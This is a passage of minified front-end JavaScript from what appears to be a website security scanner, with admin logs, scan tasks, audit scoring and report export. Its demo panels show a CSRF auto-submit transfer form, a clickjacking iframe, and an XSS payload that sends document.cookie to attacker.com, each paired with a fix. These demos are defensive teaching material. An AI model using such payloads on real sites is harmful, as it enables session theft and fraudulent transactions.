style="font-size:13px;font-weight:600">'+w(r.action||"额度变动")+"</div>",t+='<div style="font-size:11px;color:var(--text-secondary);margin-top:2px">'+Jt(r.created_at)+"</div>",t+="</div>",t+='<div style="text-align:right">',t+='<div style="font-size:13px;font-weight:700;color:'+a+'">'+o+"</div>",t+='<div style="font-size:11px;color:var(--text-secondary);margin-top:2px">余额 '+ci(r.balance_after)+"</div>",t+="</div></div>"}),t+="</div>",i.innerHTML=t}function fs(){let e=document.getElementById("scan-task-list");e&&xr().then(function(i){let t=i&&i.tasks||[];if(!t.length){e.innerHTML='<div class="card-desc">暂无扫描任务</div>';return}e.innerHTML=t.map(function(r){let s=r.status||"pending",a=s==="paused"?'<button class="btn btn-secondary" data-task-action="resume" data-task-id="'+w(r.task_id)+'">恢复</button>':s==="pending"?'<button class="btn btn-secondary" data-task-action="pause" data-task-id="'+w(r.task_id)+'">暂停</button>':"";return["pending","paused","running"].includes(s)&&(a+=' <button class="btn btn-danger" data-task-action="cancel" data-task-id="'+w(r.task_id)+'">取消</button>'),["failed","timeout"].includes(s)&&(a+=' <button class="btn btn-secondary" data-task-action="retry" data-task-id="'+w(r.task_id)+'">重试</button>'),'<div style="display:flex;justify-content:space-between;gap:10px;align-items:center;padding:10px;border-bottom:1px solid var(--border)"><div><strong>'+w(r.url||"-")+'</strong><div class="card-desc">'+w(s)+" · "+w(r.task_id||"")+"</div></div><div>"+a+"</div></div>"}).join("")}).catch(function(i){e.innerHTML='<div class="auth-form-error">'+w(i.message||"任务读取失败")+"</div>"})}document.addEventListener("click",function(e){let i=e.target&&e.target.closest("[data-task-action]");if(!i)return;let t=i.dataset.taskAction;(t==="pause"?wr:t==="resume"?kr:t==="retry"?Sr:_r)(i.dataset.taskId).then(fs).catch(function(s){T(s.message||"任务操作失败")})});function Qe(){let e=document.getElementById("admin-audit-logs"),i=document.getElementById("admin-email-logs"),t=document.getElementById("admin-audit-summary");e&&(e.innerHTML='<div class="loading">正在读取操作日志...</div>'),i&&(i.innerHTML='<div class="loading">正在读取邮件日志...</div>');let r={username:(document.getElementById("admin-log-username")||{}).value||"",resource_id:(document.getElementById("admin-log-target")||{}).value||"",action:(document.getElementById("admin-log-action")||{}).value||"",resource_type:(document.getElementById("admin-log-resource-type")||{}).value||"",status:(document.getElementById("admin-log-status")||{}).value||""},s=Number((document.getElementById("admin-log-days")||{}).value||30),a=(document.getElementById("admin-user-query")||{}).value||"",o=(document.getElementById("admin-user-role")||{}).value||"",n=(document.getElementById("admin-user-active")||{}).value||"";Promise.all([Tr(50,0,"",r),Or(),Ar(),Lr(s),Rr(a,o,n)]).then(function(d){let u=d[0]&&d[0].data&&d[0].data.logs||[],h=d[1]&&d[1].data&&d[1].data.logs||[],c=d[2]&&d[2].data||{},p=d[3]&&d[3].data||{},v=d[4]&&d[4].data&&d[4].data.users||[];t&&(t.innerHTML=vs(c));let m=document.getElementById("admin-dashboard-stats");m&&(m.innerHTML=hs(p)),e&&(e.innerHTML=Di(u,"action")),i&&(i.innerHTML=Di(h,"email_type"));let g=document.getElementById("admin-user-list");g&&(g.innerHTML=gs(v))}).catch(function(d){let u=w(d.message||"日志读取失败");e&&(e.innerHTML='<div class="auth-form-error">'+u+"</div>"),i&&(i.innerHTML='<div class="auth-form-error">'+u+"</div>")})}function gs(e){return e.length?'<div style="display:grid;gap:8px">'+e.map(function(i){let t=["admin","user"].map(function(r){return'<option value="'+r+'"'+(i.system_role===r?" selected":"")+">"+(r==="admin"?"系统管理员":"普通用户")+"</option>"}).join("");return'<div style="display:grid;grid-template-columns:minmax(120px,1fr) minmax(150px,1fr) 110px 90px;gap:8px;align-items:center;padding:10px;background:var(--bg);border:1px solid var(--border);border-radius:2px;font-size:12px"><div><strong>'+w(i.username||"-")+'</strong><div class="card-desc">#'+w(String(i.id))+" · "+w(i.created_at||"")+"</div></div><div>"+w(i.email||i.phone||"未填写联系方式")+'<div class="card-desc">积分 '+w(String(i.credits||0))+'</div></div><select data-admin-system-role="'+w(String(i.id))+'">'+t+'</select><button class="btn '+(i.is_active?"btn-danger":"btn-secondary")+'" data-admin-user-active="'+w(String(i.id))+'" data-next-active="'+(i.is_active?"0":"1")+'">'+(i.is_active?"停用":"启用")+"</button></div>"}).join("")+"</div>":'<div class="card-desc">没有匹配的用户</div>'}function vs(e){let i=e.by_action||[],t=i.slice(0,8).map(function(r){let s=Math.max(4,Math.round(r.count/Math.max(1,i[0]&&i[0].count||1)*100));return'<div style="display:grid;grid-template-columns:130px 1fr 42px;gap:8px;align-items:center;font-size:12px;margin-top:7px"><span>'+w(r.action||"-")+'</span><span style="height:7px;background:var(--border);border-radius:4px;overflow:hidden"><i style="display:block;width:'+s+'%;height:100%;background:var(--primary)"></i></span><strong>'+w(String(r.count||0))+"</strong></div>"}).join("");return'<div style="padding:12px;background:var(--bg);border:1px solid var(--border);border-radius:2px"><strong>操作统计</strong><div style="font-size:22px;margin-top:5px">'+w(String(e.total||0))+'<small style="font-size:12px;color:var(--text-secondary);margin-left:6px">条审计记录</small></div>'+(t||'<div class="card-desc">暂无统计数据</div>')+"</div>"}function hs(e){let i=e.scans||{},t=e.findings||{},r=e.tasks||{},s=(i.by_day||[]).slice(-14),a=Math.max(1,...s.map(function(c){return Number(c.count||0)})),o=s.map(function(c){let p=Math.max(5,Math.round(Number(c.count||0)/a*72));return'<div title="'+w((c.date||"")+": "+(c.count||0))+'" style="flex:1;min-width:12px;height:78px;display:flex;align-items:flex-end;justify-content:center"><i style="display:block;width:70%;height:'+p+'px;background:var(--primary);border-radius:2px 2px 0 0"></i></div>'}).join(""),n=(t.by_severity||[]).slice(0,6).map(function(c){return'<span style="padding:4px 7px;border:1px solid var(--border);border-radius:10px;font-size:11px">'+w(c.severity||"-")+" "+w(String(c.count||0))+"</span>"}).join(""),d=(i.by_risk||[]).slice(0,5).map(function(c){return'<span style="padding:4px 7px;border:1px solid var(--border);border-radius:10px;font-size:11px">风险 '+w(c.risk||"-")+" "+w(String(c.count||0))+"</span>"}).join(""),u=(r.by_status||[]).slice(0,6).map(function(c){return'<span style="padding:4px 7px;border:1px solid var(--border);border-radius:10px;font-size:11px">'+w(c.status||"-")+" "+w(String(c.count||0))+"</span>"}).join(""),h=(t.by_type||[]).slice(0,5).map(function(c){return'<span style="padding:4px 7px;border:1px solid var(--border);border-radius:10px;font-size:11px">'+w(c.type||"-")+" "+w(String(c.count||0))+"</span>"}).join("");return'<div style="display:grid;grid-template-columns:repeat(3,minmax(0,1fr));gap:8px"><div style="padding:10px;background:var(--bg);border:1px solid var(--border);border-radius:2px"><small>周期扫描</small><strong style="display:block;font-size:20px;margin-top:4px">'+w(String(i.total||0))+'</strong></div><div style="padding:10px;background:var(--bg);border:1px solid var(--border);border-radius:2px"><small>发现项</small><strong style="display:block;font-size:20px;margin-top:4px">'+w(String(t.total||0))+'</strong></div><div style="padding:10px;background:var(--bg);border:1px solid var(--border);border-radius:2px"><small>失败/超时任务</small><strong style="display:block;font-size:20px;margin-top:4px">'+w(String(r.failed||0))+'</strong></div></div><div style="margin-top:10px;padding:10px;background:var(--bg);border:1px solid var(--border);border-radius:2px"><div style="font-size:12px;font-weight:600">近 '+w(String(e.period_days||30))+' 天扫描趋势</div><div style="display:flex;gap:4px;align-items:flex-end;height:82px;margin-top:6px">'+(o||'<span class="card-desc">暂无扫描数据</span>')+'</div></div><div style="display:flex;gap:6px;flex-wrap:wrap;margin-top:8px">'+(n||'<span class="card-desc">暂无风险数据</span>')+(d?'<span style="width:1px;background:var(--border)"></span>'+d:"")+(h?'<span style="width:1px;background:var(--border)"></span>'+h:"")+(u?'<span style="width:1px;background:var(--border)"></span>'+u:"")+"</div>"}function ms(){let e={status:(document.getElementById("admin-log-status")||{}).value||"",action:(document.getElementById("admin-log-action")||{}).value||"",resource_type:(document.getElementById("admin-log-resource-type")||{}).value||"",limit:5e3};Br(e).then(function(i){let t=new Blob([i.content],{type:"text/csv;charset=utf-8"}),r=document.createElement("a");r.href=URL.createObjectURL(t),r.download=i.filename||"audit-logs.csv",document.body.appendChild(r),r.click(),r.remove(),setTimeout(function(){URL.revokeObjectURL(r.href)},0),T("日志导出已开始")}).catch(function(i){T(i.message||"日志导出失败","error")})}document.addEventListener("click",function(e){e.target&&e.target.id==="admin-log-filter"&&Qe(),e.target&&e.target.id==="admin-log-export"&&ms(),e.target&&e.target.id==="admin-user-filter"&&Qe();let i=e.target&&e.target.closest("[data-admin-user-active]");i&&confirm("确认修改该账号状态吗？")&&an(i.dataset.adminUserActive,{is_active:i.dataset.nextActive==="1"}).then(function(t){if(!t.success)throw new Error(t.message||"操作失败");T("账号状态已更新"),Qe()}).catch(function(t){T(t.message||"操作失败","error")})});document.addEventListener("change",function(e){if(e.target&&e.target.matches("[data-admin-system-role]")){let i=e.target;if(!confirm("确认将该用户角色调整为 "+i.value+" 吗？")){Qe();return}an(i.dataset.adminSystemRole,{system_role:i.value}).then(function(t){if(!t.success)throw new Error(t.message||"操作失败");T("用户角色已更新"),Qe()}).catch(function(t){T(t.message||"操作失败","error"),Qe()})}});document.addEventListener("change",function(e){e.target&&e.target.id==="admin-log-days"&&Qe()});function Di(e,i){return e.length?'<div style="display:grid;gap:8px">'+e.map(function(t){let r=t[i]||"-",s=t.resource_type?t.resource_type+":"+(t.resource_id||"-"):t.recipient_masked||"",a=t.status?" · "+t.status:"";return'<div style="padding:10px;background:var(--bg);border:1px solid var(--border);border-radius:2px;font-size:12px"><strong>'+w(r)+"</strong>"+w(a)+'<div style="color:var(--text-secondary);margin-top:4px">'+w(t.username||"用户#"+(t.user_id||"匿名"))+" · "+w(s)+" · "+w(t.client_ip||"-")+" · "+w(t.created_at||"")+"</div>"+(t.error_message?'<div style="color:var(--danger);margin-top:4px">'+w(t.error_message)+"</div>":"")+"</div>"}).join("")+"</div>":'<div class="card-desc">暂无记录</div>'}typeof window<"u"&&(window.doResetPassword=function(){let e=document.getElementById("reset-password-token"),i=document.getElementById("reset-new-password"),t=document.getElementById("reset-new-password2"),r=e?e.value.trim():"",s=i?i.value.trim():"",a=t?t.value.trim():"";if(!r){T("请输入重置 令牌");return}if(!s||s.length<6){T("新密码至少 6 个字符");return}if(s!==a){T("两次密码不一致");return}Re("/api/auth/password-reset/confirm",{token:r,new_password:s}).then(function(o){o&&o.success?(T("密码重置成功，请重新登录"),ps()):T(qe(o)||"密码重置失败")}).catch(function(o){T("密码重置失败："+o.message)})},window.doResendVerification=function(){resendVerification().then(function(e){T(e&&e.message||"验证邮件已重新发送")}).catch(function(e){T("重新发送失败："+e.message)})},window.doVerifyEmailFromToken=function(){let e=document.getElementById("verify-email-token"),i=e?e.value.trim():"";if(!i){T("请输入邮箱验证 令牌");return}Re("/api/auth/verify-email",{token:i}).then(function(t){t&&t.success?T("邮箱验证成功"):T(qe(t)||"邮箱验证失败")}).catch(function(t){T("邮箱验证失败："+t.message)})});typeof window<"u"&&(window.refreshAuthChallenge=window.refreshAuthChallenge||function(){});const vn=["源码","source map",".map","目录索引","目录遍历","路径遍历","敏感文件","泄露","注释","debug","backup","备份","phpinfo",".git",".env","source","map","index of","listing","xss","sql 注入","sqli","ssrf","open redirect","重定向","登录态","权限","csrf","idor","traversal","弱口令","防爆破","cookie","waf"],ys=new Set(["path","url","snippet","body_hint","method","detected","header","value","reason","impact","limitation"]);function Ee(e){return String(e||"").toLowerCase()}function hn(e){return[e&&e.name,e&&e.title,e&&e.summary,e&&e.description,e&&e.type,e&&e.category,e&&e.evidence_text,e&&e.evidence_html,e&&e.evidence&&JSON.stringify(e.evidence)].filter(Boolean).join(" ")}function mn(e){if(!e||typeof e!="object")return!1;const i=e.evidence&&typeof e.evidence=="object"?e.evidence:null;return i?Object.keys(i).some(t=>ys.has(t)&&i[t]!==void 0&&i[t]!==null&&String(i[t]).trim()!==""):!1}function yn(e){if(!e||typeof e!="object")return!1;const i=e.evidence&&typeof e.evidence=="object"?e.evidence:null;if(!i)return!1;const t=Object.values(i).filter(Boolean).map(r=>String(r).toLowerCase()).join(" ");return t?["sourcemappingurl","source map",".map",".env",".git",".svn",".bak","backup","dump","phpinfo","index of","directory listing","目录索引","敏感文件","源码泄露","注释","debug"].some(r=>t.includes(r)):!1}function bs(e){if(!e||typeof e!="object")return"low";const i=Ee(hn(e)),t=e.evidence&&typeof e.evidence=="object"?e.evidence:null,r=Ee(e.severity),s=yn(e),a=mn(e),o=vn.some(n=>i.includes(n));return s?"high":a&&o||(r==="high"||r==="critical")&&o?"medium":t&&(Ee(t.path).includes(".env")||Ee(t.path).includes(".git")||Ee(t.path).includes(".map")||Ee(t.url).includes(".env")||Ee(t.url).includes(".git")||Ee(t.url).includes(".map"))?"high":(o&&(i.includes("source")||i.includes("泄露")||i.includes("敏感")),"low")}function xs(e){if(!e||typeof e!="object")return!1;const i=Ee(hn(e)),t=e.evidence&&typeof e.evidence=="object"?e.evidence:null,r=Ee(e.type)||Ee(e.category),s=vn.some(n=>i.includes(n)),a=mn(e);return!!(yn(e)||a&&s||(r==="exposed"||r==="exposure"||r==="sensitive"||r==="leak")&&(s||t)||(Ee(e.name).includes("源码")||Ee(e.name).includes("敏感文件")||Ee(e.name).includes("源码泄露"))&&a)}function ws(e){return(Array.isArray(e)?e:[]).filter(xs).map(i=>({...i,confidence:bs(i)})).sort((i,t)=>{const r={high:3,medium:2,low:1},s=(r[t.confidence]||0)-(r[i.confidence]||0);if(s!==0)return s;const a={critical:4,high:3,medium:2,low:1,info:0};return(a[t.severity]||0)-(a[i.severity]||0)})}function ks(e){const i={high:0,medium:0,low:0};return(Array.isArray(e)?e:[]).forEach(t=>{const r=String(t&&t.confidence||"low").toLowerCase();i[r]!==void 0&&(i[r]+=1)}),i}function Ui(){return["源码映射文件","目录索引与备份文件","HTML 注释与调试信息","敏感配置与暴露路径","登录态与权限控制","重定向与路径校验","弱口令与防爆破","XSS / SQL 注入 / SSRF 线索","基础安全响应头"]}function ze(...e){return window.navigateTo(...e)}let de=null,We=null,bn="nginx",be=!1,Yt=1,ni=5,wt="",Zt="",Ae=!1,at=null,De=null,Me=null,Le=[],Te=0,Ot=0,$i=["正在初始化扫描引擎...","DNS 域名解析中...","建立 TCP 连接...","发送 HTTP 请求...","检查响应头安全配置...","检查 HSTS 配置...","检查 CSP 内容安全策略...","检查 X-Frame-Options...","检查 X-Content-Type-Options...","检查 Referrer-Policy...","检查 Permissions-Policy...","检测 SSL/TLS 证书...","验证证书链完整性...","检查证书有效期...","扫描敏感路径...","识别登录态与重定向风险...","检查 XSS 反射与存储特征...","检查 SQL 注入错误回显...","检查 SSRF / 路径穿越线索...","检查弱口令与限流策略...","检测 /.env 文件...","检测 /.git 目录...","检测 /admin 后台...","检测 /phpinfo.php...","检测 /.DS_Store...","识别 WAF 防火墙...","检测 Cloudflare...","检测 Nginx WAF...","检测 ModSecurity...","检查 CORS 跨域配置...","检测 Cookie 安全标志...","检查服务器信息泄露...","计算安全评分...","生成建议...","生成安全报告..."],ct=!1,Be=[];function xn(e){let i=document.getElementById("radar-chart-container");if(!i)return;let t=[{name:"加密传输",key:"https",score:0},{name:"安全响应头",key:"headers",score:0},{name:"信息隐藏",key:"info",score:0},{name:"Cookie安全",key:"cookie",score:0},{name:"访问控制",key:"cors",score:0}],r=e.is_https||!1,s=e.findings||[];t[0].score=r?20:0;let a=s.filter(function(m){return m.name.indexOf("缺少")===0&&m.severity==="high"}).length;t[1].score=Math.max(0,20-a*3);let o=s.some(function(m){return m.name.indexOf("信息泄露")>=0});t[2].score=o?10:20;let n=s.some(function(m){return m.name.indexOf("Cookie")>=0});t[3].score=n?10:20;let d=s.some(function(m){return m.name.indexOf("CORS")>=0});t[4].score=d?10:20;let u=150,h=150,c=110,p='<svg width="300" height="300" viewBox="0 0 300 300" style="display:block;max-width:100%">';for(let m=1;m<=5;m++){let g=c*m/5,y=[];for(let b=0;b<5;b++){let _=Math.PI*2*b/5-Math.PI/2;y.push(u+g*Math.cos(_)+","+(h+g*Math.sin(_)))}p+='<polygon points="'+y.join(" ")+'" fill="none" stroke="rgba(75,110,175,0.15)" stroke-width="1"/>'}for(let m=0;m<5;m++){let g=Math.PI*2*m/5-Math.PI/2,y=u+c*Math.cos(g),b=h+c*Math.sin(g);p+='<line x1="'+u+'" y1="'+h+'" x2="'+y+'" y2="'+b+'" stroke="rgba(75,110,175,0.2)" stroke-width="1"/>'}let v=[];for(let m=0;m<5;m++){let g=Math.PI*2*m/5-Math.PI/2,y=c*t[m].score/20;v.push(u+y*Math.cos(g)+","+(h+y*Math.sin(g)))}p+='<defs><radialGradient id="radarGrad"><stop offset="0%" stop-color="rgba(75,110,175,0.6)"/><stop offset="100%" stop-color="rgba(168,85,247,0.4)"/></radialGradient></defs>',p+='<polygon points="'+v.join(" ")+'" fill="url(#radarGrad)" stroke="#4b6eaf" stroke-width="2" style="filter:drop-shadow(0 0 8px rgba(75,110,175,0.5));transition:all 1s ease-out">',p+='<animate attributeName="opacity" from="0" to="1" dur="1s" fill="freeze"/>',p+="</polygon>";for(let m=0;m<5;m++){let g=Math.PI*2*m/5-Math.PI/2,y=c*t[m].score/20,b=u+y*Math.cos(g),_=h+y*Math.sin(g);p+='<circle cx="'+b+'" cy="'+_+'" r="4" fill="#4b6eaf" stroke="#bbbbbb" stroke-width="2"/>'}for(let m=0;m<5;m++){let g=Math.PI*2*m/5-Math.PI/2,y=u+(c+25)*Math.cos(g),b=h+(c+25)*Math.sin(g),_=Math.abs(Math.cos(g))<.2?"middle":Math.cos(g)>0?"start":"end";p+='<text x="'+y+'" y="'+b+'" text-anchor="'+_+'" font-size="12" font-weight="600" fill="var(--text-primary)" dominant-baseline="middle">'+t[m].name+"</text>",p+='<text x="'+y+'" y="'+(b+14)+'" text-anchor="'+_+'" font-size="11" font-weight="700" fill="#4b6eaf" dominant-baseline="middle">'+t[m].score+"/20</text>"}p+="</svg>",i.innerHTML=p}function _s(e){let i=document.getElementById("attack-演示-result");i&&(i.innerHTML='<div style="background:#3c3f41;border:1px solid rgba(199,84,80,0.3);border-radius:2px;padding:14px;animation:fadeInUp 0.4s"><div style="display:flex;align-items:center;gap:8px;margin-bottom:10px"><span style="background:#dc2626;color:#fff;padding:3px 8px;border-radius:2px;font-size:11px;font-weight:700">风险示例</span><span style="font-weight:600;font-size:13px">CSRF 跨站请求伪造</span></div><div style="background:#1f2937;color:#73c990;padding:10px;border-radius:2px;font-family:monospace;font-size:12px;line-height:1.6;margin-bottom:10px"><div>// 攻击者构造的恶意页面</div><div>&lt;form action="'+w(e)+'/api/transfer" method="POST"&gt;</div><div>&nbsp;&nbsp;&lt;input name="to" value="attacker"&gt;</div><div>&nbsp;&nbsp;&lt;input name="amount" value="10000"&gt;</div><div>&lt;/form&gt;</div><div>&lt;script&gt;document.forms[0].submit();&lt;/script&gt;</div></div><div style="background:rgba(199,84,80,0.1);border-left:3px solid #c75450;padding:8px 10px;font-size:12px;color:#c75450;border-radius:2px;margin-bottom:10px"><strong>如果目标未设置 CSRF 令牌，受害者点击后资金会被转走。</strong></div><div style="background:rgba(115,201,144,0.1);border-left:3px solid #73c990;padding:8px 10px;font-size:12px;color:#73c990;border-radius:2px"><strong>修复：</strong>添加 <code style="background:#3c3f41;padding:1px 4px;border-radius:3px">SameSite=Strict</code> Cookie + CSRF 令牌 验证</div></div>')}function Ss(e){let i=document.getElementById("attack-演示-result");i&&(i.innerHTML='<div style="background:#3c3f41;border:1px solid rgba(240,167,50,0.3);border-radius:2px;padding:14px;animation:fadeInUp 0.4s"><div style="display:flex;align-items:center;gap:8px;margin-bottom:10px"><span style="background:#ea580c;color:#fff;padding:3px 8px;border-radius:2px;font-size:11px;font-weight:700">风险示例</span><span style="font-weight:600;font-size:13px">XSS 反射型注入</span></div><div style="background:#1f2937;color:#73c990;padding:10px;border-radius:2px;font-family:monospace;font-size:12px;line-height:1.6;margin-bottom:10px"><div>// 攻击 URL</div><div>'+w(e)+`/search?q=&lt;script&gt;</div><div>&nbsp;&nbsp;fetch('//attacker.com/steal?c='+document.cookie)</div><div>&nbsp;&nbsp;&lt;/script&gt;</div><div>// 受害者的 Cookie 被发送到攻击者服务器</div></div><div style="background:rgba(240,167,50,0.1);border-left:3px solid #f0a732;padding:8px 10px;font-size:12px;color:#f0a732;border-radius:2px;margin-bottom:10px"><strong>如果目标没有 CSP 策略，恶意脚本会被浏览器执行。</strong></div><div style="background:rgba(115,201,144,0.1);border-left:3px solid #73c990;padding:8px 10px;font-size:12px;color:#73c990;border-radius:2px"><strong>修复：</strong>添加 <code style="background:#3c3f41;padding:1px 4px;border-radius:3px">Content-Security-Policy</code> 头 + 输入输出转义</div></div>`)}function Es(e){let i=document.getElementById("attack-演示-result");i&&(i.innerHTML='<div style="background:#3c3f41;border:1px solid rgba(168,85,247,0.3);border-radius:2px;padding:14px;animation:fadeInUp 0.4s"><div style="display:flex;align-items:center;gap:8px;margin-bottom:10px"><span style="background:#9333ea;color:#fff;padding:3px 8px;border-radius:2px;font-size:11px;font-weight:700">风险示例</span><span style="font-weight:600;font-size:13px">点击劫持</span></div><div style="background:#1f2937;color:#73c990;padding:10px;border-radius:2px;font-family:monospace;font-size:12px;line-height:1.6;margin-bottom:10px"><div>// 攻击者页面</div><div>&lt;iframe src="'+w(e)+'"</div><div>&nbsp;&nbsp;style="opacity:0.1;position:absolute;top:0;left:0;"&gt;</div><div>&lt;/iframe&gt;</div><div>&lt;button style="position:absolute;top:50px"&gt;点这里领奖&lt;/button&gt;</div></div><div style="background:rgba(168,85,247,0.1);border-left:3px solid #9333ea;padding:8px 10px;font-size:12px;color:#c084fc;border-radius:2px;margin-bottom:10px"><strong>用户以为点在"领奖"按钮，实际上在点击下层网站的"删除"按钮。</strong></div><div style="background:rgba(115,201,144,0.1);border-left:3px solid #73c990;padding:8px 10px;font-size:12px;color:#73c990;border-radius:2px"><strong>修复：</strong>添加 <code style="background:#3c3f41;padding:1px 4px;border-radius:3px">X-Frame-Options: DENY</code> 或 CSP frame-ancestors</div></div>')}function wn(e){let i=document.querySelector(".score-ring .score-value");if(!i)return;e=parseInt(e,10),(isNaN(e)||e<0)&&(e=0),e>100&&(e=100),at&&(clearInterval(at),at=null);let t=0,r=Math.max(1,Math.floor(e/50));at=setInterval(function(){t+=r,t>=e&&(t=e,clearInterval(at),at=null),i.textContent=t},20)}function xi(){try{return(function(){try{return JSON.parse(localStorage.getItem("vs_monitors")||"[]")}catch{return[]}})()}catch{return[]}}function kn(e){try{(function(){try{localStorage.setItem("vs_monitors",JSON.stringify(e))}catch{}})()}catch{}}function zs(){let e=document.getElementById("monitor-url-input"),i=document.getElementById("monitor-freq-select"),t=e.value.trim(),r=i.value;if(!t){T("请输入 URL");return}/^https?:\/\//i.test(t)||(t="http://"+t);let s=xi();if(s.some(function(n){return n.url===t})){T("该 URL 已在监控列表中");return}let o={url:t,freq:r,added_at:new Date().toISOString(),last_scan:"-",score:null};ce("/api/targets",{method:"POST",body:JSON.stringify({url:t,schedule:r})}).then(function(n){return n.json()}).then(function(n){n.id&&(o.id=n.id)}).catch(function(){}),s.push(o),kn(s),e.value="",wi(),T("监控目标已添加")}function Is(e){if(!confirm("确定要删除此监控目标吗？"))return;let i=xi(),t=i[e];t&&t.id&&ce("/api/targets/"+t.id,{method:"DELETE"}).catch(function(){}),i.splice(e,1),kn(i),wi(),T("监控目标已删除")}function wi(){let e=document.getElementById("monitor-target-list");if(!e)return;let i=xi();if(i.length===0){e.innerHTML='<div class="monitor-empty">暂无监控目标，请添加需要定期扫描的网站</div>';return}let t={daily:"每天",weekly:"每周",none:"不扫描"},r="";i.forEach(function(s,a){let o=s.score!==null?s.score>=75?"var(--success)":s.score>=50?"var(--warning)":"var(--danger)":"var(--text-lighter)";r+='<div class="monitor-item">',r+='<div style="flex:1;min-width:0">',r+='<div class="monitor-item-url">'+w(s.url)+"</div>",r+='<div class="monitor-item-meta">'+t[s.freq]||s.freq+" &middot; 上次扫描: "+(s.last_scan||"-")+"</div>",r+="</div>",r+='<div class="monitor-item-score" style="color:'+o+'">'+(s.score!==null?s.score:"-")+"</div>",r+='<button class="monitor-item-del" onclick="removeMonitorTarget('+a+')"></button>',r+="</div>"}),e.innerHTML=r}function Cs(e){if(!de){T("暂无扫描结果");return}let i=e||"pdf",t=i==="html"?"HTML":"PDF",r=i==="html"?"html":"pdf";T("正在生成 "+t+" 报告，请稍候...");function s(o){let n="/api/report/"+encodeURIComponent(o)+"?format="+i,d=Ts(de.url,r);i==="html"?ce(n).then(function(u){if(!u.ok)throw new Error("报告生成失败（"+u.status+")");return u.text()}).then(function(u){let h=new Blob([u],{type:"text/html;charset=utf-8"}),c=URL.createObjectURL(h),p=document.createElement("a");p.href=c,p.download=d,document.body.appendChild(p),p.click(),document.body.removeChild(p),URL.revokeObjectURL(c),T("HTML 报告已下载："+d)}).catch(function(u){T("报告下载失败: "+u.message)}):ce(n).then(function(u){if(!u.ok)throw new Error("PDF 生成失败（"+u.status+")");return u.blob()}).then(function(u){let h=URL.createObjectURL(u),c=document.createElement("a");c.href=h,c.download=d,document.body.appendChild(c),c.click(),document.body.removeChild(c),URL.revokeObjectURL(h),T("PDF 报告已下载："+d)}).catch(function(u){T("PDF 下载失败: "+u.message)})}let a=de.scan_id;!a||isNaN(Number(a))?ce("/api/history?limit=1").then(function(o){return o.json()}).then(function(o){let n=(o.history||[])[0];n&&n.id?s(n.id):T("当前结果暂不支持下载")}).catch(function(o){T("获取扫描记录失败: "+o.message)}):s(a)}function Ts(e,i){return"security-report-"+((nt(e||"report")||"report").replace(/[^a-zA-Z0-9._-]+/g,"-").replace(/^-+|-+$/g,"")||"report")+"."+i}function As(){let e=document.getElementById("report-dropdown");e&&(e.classList.toggle("show"),e.classList.contains("show")&&setTimeout(function(){document.addEventListener("click",_n)},0))}function _n(e){let i=document.querySelector(".report-download-dropdown"),t=document.getElementById("report-dropdown");i&&!i.contains(e.target)&&t&&(t.classList.remove("show"),document.removeEventListener("click",_n))}function Ls(){try{return localStorage.getItem("vs_home_onboarding_seen")!=="1"}catch{return!0}}function Bs(){try{localStorage.setItem("vs_home_onboarding_seen","1")}catch{}let e=document.getElementById("home-onboarding-banner");e&&(e.style.display="none")}function Os(){let e=document.getElementById("home-onboarding-banner");e&&(Ls()?e.style.display="block":e.style.display="none")}function Sn(){let e=document.getElementById("scan-credits-hint"),i=document.getElementById("scan-credits-value");if(!(!e||!i)){if(!he()){e.style.display="none";return}e.style.display="block",ce("/api/me/credits").then(function(t){return t.json()}).then(function(t){let r=t&&t.data&&typeof t.data.credits=="number"?t.data.credits:t&&typeof t.credits=="number"?t.credits:null;i.textContent=r===null?"--":String(r)}).catch(function(){i.textContent="--"})}}function Rs(){let e=document.getElementById("dashboard-overview");if(!he()){e&&(e.style.display="none");return}e&&(e.style.display="grid"),Os(),Sn(),ce("/api/dashboard").then(function(i){return i.json()}).then(function(i){let t=document.getElementById("home-stat-scan-count"),r=document.getElementById("home-stat-high-risk"),s=document.getElementById("home-stat-fixed-count"),a=document.getElementById("home-stat-score");t&&(t.textContent=i.total_scans||0),r&&(r.textContent=i.high_risk_count||0),s&&(s.textContent=i.fixed_count||0),a&&i.recent_scans&&i.recent_scans.length>0?a.textContent=i.recent_scans[0].score||"-":a&&(a.textContent="-")}).catch(function(){}),zn(),loadTrendChart(30)}let ri=!1,Xt=null;function En(){let e=document.getElementById("audit-url");if(e&&e.value)return e.value.trim();if(de&&de.url)return String(de.url).trim();let i=document.getElementById("scan-url");return i&&i.value?i.value.trim():""}function Ms(){let e=document.getElementById("audit-url");if(!e)return;let i=En();if(!i){T("当前没有可用的网址，请先在扫描页输入网址","warn");return}e.value=i,T("已填入当前网址","success")}function qi(e,i){let t=w(e.name||e.title||"审计项 "+(i+1)),r=String(e.severity||"info").toLowerCase(),s=w(e.summary||e.description||""),a=r==="critical"||r==="high"?"#c75450":r==="medium"?"#f0a732":"#73c990",o=r==="critical"?"严重":r==="high"?"高危":r==="medium"?"中危":r==="low"?"低危":"信息",n=e.confidence||"low",d="";return e.evidence&&typeof e.evidence=="object"?d=li(e.evidence):e.evidence_text?d='<div style="margin-top:10px;font-size:12px;color:var(--text-secondary)">'+w(e.evidence_text)+"</div>":e.evidence_html&&(d='<div style="margin-top:10px">'+e.evidence_html+"</div>"),'<div style="padding:14px 16px;border:1px solid var(--border);border-radius:2px;background:var(--bg);margin-bottom:10px"><div style="display:flex;justify-content:space-between;gap:12px;align-items:flex-start;margin-bottom:8px"><div style="font-weight:700;color:var(--text)">'+t+'</div><span style="flex:0 0 auto;padding:2px 8px;border-radius:2px;background:'+a+"20;color:"+a+';font-size:12px;font-weight:700">'+o+'</span><span style="flex:0 0 auto;padding:2px 8px;border-radius:2px;background:rgba(75,110,175,0.12);color:#4b6eaf;font-size:12px;font-weight:700">置信度 '+n+"</span></div>"+(s?'<div style="font-size:13px;line-height:1.7;color:var(--text-secondary)">'+s+"</div>":"")+d+"</div>"}async function Ps(){if(ri)return;let e=document.getElementById("audit-url"),i=document.getElementById("audit-status"),t=document.getElementById("audit-result"),r=document.getElementById("audit-run-btn"),s=document.getElementById("audit-auth-check"),a=En();if(!a){T("请输入要审计的网址","warn"),e&&e.focus();return}if(s&&!s.checked){T("请先确认已获得授权","warn");return}ri=!0,r&&(r.disabled=!0,r.textContent="审计中..."),i&&(i.textContent="正在审计 "+a+"，请稍候..."),t&&(t.innerHTML='<div style="text-align:center;padding:24px 16px;color:var(--text-secondary)">正在分析源码泄露、敏感文件与上线前基础风险...</div>');try{let o=await br({url:a,depth:"standard",authorized:!0}),n=Array.isArray(o.findings)?o.findings:[],d=ws(n),u=ks(d),h=d.filter(function(x){return x.confidence!=="low"}),c=d.filter(function(x){return 